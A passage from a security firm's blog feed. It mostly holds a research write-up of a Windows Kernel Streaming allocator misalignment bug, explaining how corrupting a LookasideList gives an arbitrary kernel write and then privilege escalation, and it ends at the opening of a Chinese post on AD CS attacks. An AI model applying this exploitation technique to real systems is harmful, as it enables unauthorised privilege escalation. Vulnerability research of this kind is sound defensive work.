&lt;p&gt;Before diving into that, we first need to introduce a key object in Kernel Streaming: the &lt;a href=&quot;https://learn.microsoft.com/sr-latn-rs/windows-hardware/drivers/stream/ks-allocators&quot;&gt;KS Allocator&lt;/a&gt;. The KS Allocator is responsible for pre-allocating a set of frame buffers that can be reused during streaming operations. This significantly reduces the overhead of dynamic memory allocation at runtime. Typically, an allocator object is associated with a pin, and third-party drivers can also implement their own custom allocator if needed. Kernel Streaming also provides a default allocator for use when no custom implementation is specified.&lt;/p&gt;

&lt;p&gt;In general, a KS Allocator can be created using the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nf-ks-kscreateallocator&quot;&gt;KsCreateAllocator&lt;/a&gt; API, and configured through a structure called &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-ksallocator_framing&quot;&gt;KSALLOCATOR_FRAMING&lt;/a&gt;. This structure allows you to specify parameters such as the number of frame buffers, the size of each buffer, and even the alignment requirements for each frame buffer.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;typedef struct {
  union {
    ULONG OptionsFlags;
    ULONG RequirementsFlags;
  };
#if ...
  POOL_TYPE PoolType;
#else
  ULONG     PoolType;
#endif
  ULONG     Frames;
  ULONG     FrameSize;
  union {
    ULONG FileAlignment;
    LONG  FramePitch;
  };
  ULONG     Reserved;
} KSALLOCATOR_FRAMING, *PKSALLOCATOR_FRAMING;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note :&lt;/strong&gt; To specify the alignment of a frame buffer, you must provide an alignment mask during allocator configuration.&lt;/p&gt;

&lt;p&gt;After creating a KS Allocator, we can attach it to the pin. Before reading data from the pin, we need to set its state to &lt;strong&gt;KSSTATE_RUN&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At that moment, the allocator will pre-allocate the number of frame buffers based on the configuration provided earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From that point on, data is streamed from the device into pre-allocated frame buffers. Corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; structures are also allocated. When we send an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_READ_STREAM&lt;/code&gt; to read data, the process begins just as described earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, instead of reading data from the device each time, the worker thread will copy data from the pre-allocated frame buffers managed by the allocator. In the following section, weâ€™ll focus on how the default allocator manages these pre-allocated buffers.&lt;/p&gt;

&lt;p&gt;Letâ€™s take a deeper look at &lt;strong&gt;DefaultAllocator&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;ks!KsCreateDefaultAllocatorEx
&lt;img src=&quot;/assets/img/blog/20250517/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsCreateAllocator&lt;/code&gt;, Kernel Streaming creates a default allocator and initializes it using the parameters we provide. Internally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; implements its own custom allocation routine - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DefAllocatorAlloc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DefAllocaorFree&lt;/code&gt; â€” and utilizes a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&quot;&gt;LookasideList&lt;/a&gt; to efficiently manage buffer allocations and reuse.&lt;/p&gt;

&lt;p&gt;The allocation function is quite simple :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;char *__fastcall DefAllocatorAlloc(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Alignment)
{
    ...
    if ( Alignment &amp;gt;= FILE_OCTA_ALIGNMENT )
        FileAlignment = Alignment;
    ...
    buffer = ExAllocatePoolWithTag((PoolType | 0x400), v8, &apos;adSK&apos;);//-----[10]
    if ( buffer )
    {
        padding = (~FileAlignment &amp;amp; (buffer + FileAlignment + 4)) - buffer;
        buffer += padding;
        *(buffer - 1) = padding; //-------[11]
    }

}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It simply calls &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag&quot;&gt;ExAllocatePoolWithTag&lt;/a&gt; to allocate memory at [10]. If an alignment is specified, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; records the size of the required padding in front of the frame buffer, as shown at [11].&lt;/p&gt;

&lt;p&gt;In the free routine :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;void __fastcall DefAllocatorFree(unsigned int *Buffer)
{
  __int64 padding; 
  ...
  if ( (Buffer &amp;amp; 0xFFF) != 0 )
    padding = *(Buffer - 1); //---------------[12]
  else
    padding = 0LL;
  ExFreePoolWithTag(Buffer - padding, 0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;KS use this padding size to calculate the original pointer returned by &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag&quot;&gt;ExAllocatePoolWithTag&lt;/a&gt; at [12].&lt;/p&gt;

&lt;p&gt;As shown in the diagram below, the memory layout of the pool looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The purple region represents the padding, while the blue region corresponds to the frame buffer itself. The 4 bytes immediately preceding the frame buffer are used to store the padding size. Under normal case, the alignment mask is expected to be a power-of-two minus one (e.g., 0x3F, 0xFFF, etc.).&lt;/p&gt;

&lt;p&gt;However, hereâ€™s the problem:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;KS only checks whether the alignment mask is greater than 0xFFF. If itâ€™s less than 0xFFF, it accepts any value, even if itâ€™s not a valid alignment.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Useless Bug ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At first glance, this might seem like a harmless bug â€” just a minor issue with memory alignment. But what happens when that misaligned buffer meets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;?&lt;/p&gt;

&lt;h4 id=&quot;lookasidelist&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&quot;&gt;LookasideList&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; are per-processor caches optimized for fixed-size memory blocks. Instead of using the general pool allocator, they maintain a simple singly linked list for fast allocation and deallocation. &lt;strong&gt;Both allocations and frees always check the list first before using the general pool, and the list operates in LIFO (Last-In, First-Out) order.&lt;/strong&gt; One important constraint is that entries stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; &lt;strong&gt;is expected to be aligned to 0x10 bytes&lt;/strong&gt;. You can refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-slist_entry&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SLIST_ENTRY&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As you can see in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExAllocateFromNPagedLookasideList&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;PSLIST_ENTRY ExAllocateFromNPagedLookasideList(...){
    ...
    ReturnChunk = ListHead-&amp;gt;FreeChunk &amp;amp; 0xFFFFFFFFFFFFFFF0;
    ListHead-&amp;gt;FreeChunk = ReturnChunk-&amp;gt;Next;
    ListHead-&amp;gt;Depth-- ;
    ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The allocation logic aligns the returned chunk address to 0x10 bytes before returning it to the caller.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;PSLIST_ENTRY ExFreeToNPagedLookasideList(...,PSLIST_ENTRY Chunk){
    ...
    NextChunk = ListHead-&amp;gt;FreeChunk &amp;amp; 0xFFFFFFFFFFFFFFF0
    Chunk-&amp;gt;Next = NextChunk;
    ListHead-&amp;gt;FreeChunk = Chunk;
    ListHead-&amp;gt;Depth++;
    ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Similarly, when freeing memory back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;, it also aligns the chunk. As shown in this code snippet above, the free routine aligns the first entry in the list&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Nonâ€“0x10-byteâ€“aligned Frame Buffer + LookasideList&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, what happens if a frame buffer thatâ€™s not 0x10-byte aligned is inserted into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;?&lt;/p&gt;

&lt;h4 id=&quot;lets-play-the-funky-frame&quot;&gt;Letâ€™s play the funky frame.&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We write a script to list out all possible alignment mask and padding size. In this case, weâ€™re using an alignment mask that results in 8 bytes of padding. Then, we configured the allocator to pre-allocate 4 frame buffer. As a result, each buffer will follow the same layout â€” and due to the 8-byte padding, the resulting frame buffer addresses all end with 0x08.&lt;/p&gt;

&lt;p&gt;The buffers will look like this one : 
&lt;img src=&quot;/assets/img/blog/20250517/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, the allocator returns four buffers â€” A, B, C, and D â€” all of which have addresses ending in 0x8 due to the applied padding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When these buffers are freed, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; releases them one by one and inserts each of them into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; in order.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As illustrated in the diagram above, we first free &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame A&lt;/code&gt;, which gets inserted into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; without any issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame B&lt;/code&gt; is freed, the allocator first aligns the address of the current list head (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame A&lt;/code&gt;) to satisfy the 0x10-byte alignment requirement. &lt;strong&gt;It then stores this aligned address in the next pointer field of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame B&lt;/code&gt;&lt;/strong&gt;, and inserts Frame B at the head of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We continue by freeing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame C&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame D&lt;/code&gt;, both of which follow the same pattern as before. In the end, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; will look like the layout illustrated in the diagram above.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Have you spotted the issue?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The issue lies in the &lt;strong&gt;next pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame D&lt;/code&gt;&lt;/strong&gt;. Due to alignment, &lt;strong&gt;the next pointer ends up pointing to the start of the pool chunk, rather than the actual frame buffer&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the diagram above, youâ€™ll notice that the next pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame C&lt;/code&gt; points to the padding area, which contains the stored padding size, not the expected list entry structure. When interpreted as a 64-bit value, this pointer becomes something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000000&lt;/code&gt; â€”
which falls within the user-space address range.&lt;/p&gt;

&lt;p&gt;Our plan is to allocate a memory page at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000000&lt;/code&gt;, allowing us to gain control over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;. We then configure the final node in the list to point to our desired target address. After that, when the device performs a read operation,
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will write the incoming data into these frame buffers â€” including the one pointing to our chosen address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In theory, this gives us an arbitrary memory write primitive, right?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;However, we still face the same limitation as before: we cannot control the content that gets written.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Additionally, we cannot use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffered flag&lt;/code&gt; in this scenario, which means weâ€™re limited to whatever data the device sends â€” making precise exploitation much more difficult.&lt;/p&gt;

&lt;p&gt;At this point, we were stuck again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But after thinking it through once more, we found another way forward.&lt;/p&gt;

&lt;h4 id=&quot;lets-make-the-lookasidelist-great-again&quot;&gt;Letâ€™s make the LookasideList great again&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the diagram above, we first construct a fake linked list in user space. The address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41410000&lt;/code&gt; represents a user-controlled memory region, which we use to construct a valid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; entry. Then, we proceed to allocate the frame buffer, which causes the allocator to traverse the fake list weâ€™ve constructed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExAllocateFromNPagedLookasideList&lt;/code&gt;, the allocator first aligns the chunk and then updates the list head. However, due to the misalignment, the alignment logic mistakenly &lt;strong&gt;interprets the start of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame&lt;/code&gt; D as a next pointer&lt;/strong&gt; â€” leading to incorrect traversal of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the first chunk is popped from the list, the linked list transforms into the state shown in the diagram above. Next, we allocate all remaining chunks from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;. We also configure the allocator to use smaller frame buffers, which causes the webcam to &lt;strong&gt;enter a wait state â€” it no longer reads data from the device&lt;/strong&gt;. Next, we trigger a STOP to release all of the frame buffers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The frame buffer will appear as shown in the diagram above. At this point, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; begins returning the buffers to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;, one by one. First, it releases &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Frame D&lt;/code&gt;. Then, it frees the malicious chunk at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000000&lt;/code&gt;. After that, it frees the fake chunk at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41410000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the three chunks have been released, the structure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; transforms into the layout illustrated above. In the end, the allocator will release our target address.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;It will cause the next pointer of target address to point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x41410000&lt;/code&gt;&lt;/strong&gt;. This value can be any user-space address controlled by the attacker.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In other words, we now have a powerful arbitrary memory write primitive.&lt;/p&gt;

&lt;p&gt;After gaining arbitrary memory write on Windows 23H2, we can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation&quot;&gt;NtQuerySystemInformation&lt;/a&gt; to leak the address of the &lt;a href=&quot;https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_ETHREAD&quot;&gt;thread object&lt;/a&gt;. With that address, we &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;flip the necessary bit&lt;/a&gt; in the token structure to escalate privileges. From here, we can apply any &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;well-known EoP&lt;/a&gt; technique to achieve full privilege escalation. By the way, once youâ€™ve achieved arbitrary memory write, &lt;strong&gt;donâ€™t forget to restore the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;&lt;/strong&gt; to a valid state â€” otherwise, the system may crash during subsequent allocations.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/QSPbzE1KUbA?si=Dgow1vCMCaKASNra&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;Weâ€™ve successfully turned what seemed like a harmless bug into a serious vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;the-next--summary&quot;&gt;The Next &amp;amp; Summary&lt;/h2&gt;

&lt;p&gt;This bug patterns may not be limited to Kernel Streaming alone. By paying closer attention to MDL-related issues, you might be able to discover many more bugs in other driver. Kernel Streaming remains a fascinating research target and likely still harbors many undiscovered vulnerabilities beneath its surface.&lt;/p&gt;

&lt;p&gt;Gaining a deep understanding of Windows API implementations â€” and recognizing the risks of their misuse â€” is essential to uncovering new vulnerabilities and building effective exploitation techniques.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Keep these patterns in mind â€” it might be your next vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls&quot;&gt;Using MDLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis
&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Easy Local Windows Kernel Exploitation
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2025/05/17/frame-by-frame-kernel-streaming-keeps-giving-vulnerabilities-en/</link>
                <guid>https://devco.re/blog/2025/05/17/frame-by-frame-kernel-streaming-keeps-giving-vulnerabilities-en</guid>
                <pubDate>Sat, 17 May 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é—œæ–¼åˆ†åˆ†é˜æ‹¿ä¸‹æ•´å€‹ç¶²åŸŸï¼Œä½ é‚„ç–å¿½äº†ä»€éº¼ï¼Ÿ</title>
                <description>&lt;p&gt;æœ¬ç¯‡åŸºæ–¼å¼·è€…æˆ‘éšŠé•· vtim åœ¨ DEVCORE Conference 2024 çš„ talkã€Œ&lt;a href=&quot;https://conf.devco.re/2024/keynote/DEVCORE-CONFERENCE-2024-Vtim-Taking-down-AD-in-minutes-things-that-you-missed-about-AD.pdf&quot;&gt;åˆ†åˆ†é˜æ‹¿ä¸‹æ•´å€‹ç¶²åŸŸ - é—œæ–¼ ADï¼Œä½ é‚„ç–å¿½äº†ä»€éº¼ï¼Ÿ&lt;/a&gt;ã€ã€‚&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;æœ¬æ–‡åˆ†äº«æˆ‘å€‘åœ¨å¯¦æˆ°ä¸Šé‡åˆ° AD CS çš„ç¶“é©—ä»¥åŠç‰¹åˆ¥çš„æ¡ˆä¾‹ï¼Œä¸¦ä»‹ç´¹ AD CS çš„åŸºæœ¬æ¦‚å¿µï¼Œå¸Œæœ›è®“ä¼æ¥­èˆ‡å° Active Directory å®‰å…¨æœ‰èˆˆè¶£çš„è®€è€…äº†è§£å…¶é‡è¦æ€§å’Œæ½›åœ¨çš„é¢¨éšªã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#ä»€éº¼æ˜¯-ad-cs&quot;&gt;ä»€éº¼æ˜¯ AD CSï¼Ÿ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å¯¦æˆ°çµ±è¨ˆ&quot;&gt;å¯¦æˆ°çµ±è¨ˆ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ä¸€å€‹æ¼æ´çš„ç”¢ç”Ÿ&quot;&gt;ä¸€å€‹æ¼æ´çš„ç”¢ç”Ÿ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ç¶²åŸŸé¢¨éšª&quot;&gt;ç¶²åŸŸé¢¨éšª&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#æ¡ˆä¾‹åˆ†äº«&quot;&gt;æ¡ˆä¾‹åˆ†äº«&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#æ¡ˆä¾‹ä¸€esc8--esc3-like-escalation&quot;&gt;æ¡ˆä¾‹ä¸€ï¼šESC8 + ESC3-like Escalation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#æ¡ˆä¾‹äºŒæ²’æœ‰-135-port-çš„-esc11&quot;&gt;æ¡ˆä¾‹äºŒï¼šæ²’æœ‰ 135 port çš„ ESC11&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#æ¡ˆä¾‹ä¸‰æ’¿åˆ°ç§é‘°&quot;&gt;æ¡ˆä¾‹ä¸‰ï¼šæ’¿åˆ°ç§é‘°&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#çµèª&quot;&gt;çµèª&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#references&quot;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ä»€éº¼æ˜¯-ad-cs&quot;&gt;ä»€éº¼æ˜¯ AD CSï¼Ÿ&lt;/h2&gt;

&lt;p&gt;åœ¨ä¼æ¥­ä¸­ï¼Œç®¡ç†å…§ç¶²å¤§é‡ä¸»æ©Ÿä¸€ç›´éƒ½æ˜¯ç³»çµ±ç®¡ç†å“¡çš„ä¸€å¤§æŒ‘æˆ°ã€‚Microsoft æä¾›äº† Active Directory é€™å€‹è§£æ±ºæ–¹æ¡ˆ (ä»¥ä¸‹ç°¡ç¨±ç‚º AD)ï¼Œä»¥éšå±¤å¼ä¸”é›†ä¸­åŒ–çš„æ¶æ§‹ä¾†ç®¡ç†é›»è…¦ã€ä½¿ç”¨è€…åŠè³‡æºï¼Œå®ƒçš„æ–¹ä¾¿æ€§ä¹Ÿå› æ­¤æˆç‚ºè¨±å¤šä¼æ¥­æ„›ç”¨çš„å…§ç¶²ç®¡ç†å·¥å…·ã€‚å¾ 2017 å¹´ç´…éšŠæ¼”ç·´çµ±è¨ˆè‡³ä»Šï¼Œæˆ‘å€‘ç´„æœ‰ 89.6% çš„å®¢æˆ¶ä½¿ç”¨ AD ä½œçˆ²ç®¡ç†çš„è§£æ±ºæ–¹æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;AD CSï¼Œå…¨åç‚º Active Directory Certificate Servicesï¼Œæ˜¯ Microsoft æä¾›åœ¨ AD ä¸­ä½œç‚ºå¯é¸ç”¨çš„ PKI è§’è‰²ï¼Œç”¨æ–¼æ†‘è­‰ç®¡ç†å’Œé ’ç™¼ã€èº«åˆ†é©—è­‰ã€åŠ å¯†å‚³è¼¸ç­‰ã€‚AD CS çš„ CA (Certificate Authority) åˆ†ç‚ºå…©ç¨®æ¨¡å¼ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Standalone CA&lt;/li&gt;
  &lt;li&gt;Enterprise CA -&amp;gt; æœ¬æ–‡è¦æ¢è¨çš„é…ç½®&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Enterprise CA æ¨¡å¼æœƒèˆ‡ AD æ•´åˆï¼Œå› æ­¤èº«åˆ†é©—è­‰åŠæ†‘è­‰æ¬Šé™ç­‰è¨­å®šæ˜¯å’Œ AD çš„èº«åˆ†ç¶å®šï¼Œä¹Ÿæ˜¯ä¼æ¥­é€šå¸¸æ¡ç”¨çš„æ–¹å¼ã€‚&lt;/p&gt;

&lt;p&gt;è«‡åˆ° AD CS çš„é‹ä½œï¼Œæ†‘è­‰æ˜¯é€éæ†‘è­‰ç¯„æœ¬ (Certificate Templates) ä¾†ç®¡ç†ï¼Œå®ƒåŒ…å«é€™å¼µæ†‘è­‰çš„å„ç¨®å±¬æ€§å¦‚ Extended Key Usage (EKU)ã€åŠ å¯†æ–¹å¼ã€ç”³è«‹æ¬Šé™ã€æœ‰æ•ˆæ™‚é–“ç­‰ï¼Œä¼æ¥­å¯ä»¥æ ¹æ“šéœ€æ±‚å»ºç«‹ä¸åŒçš„æ†‘è­‰ç¯„æœ¬ã€‚&lt;/p&gt;

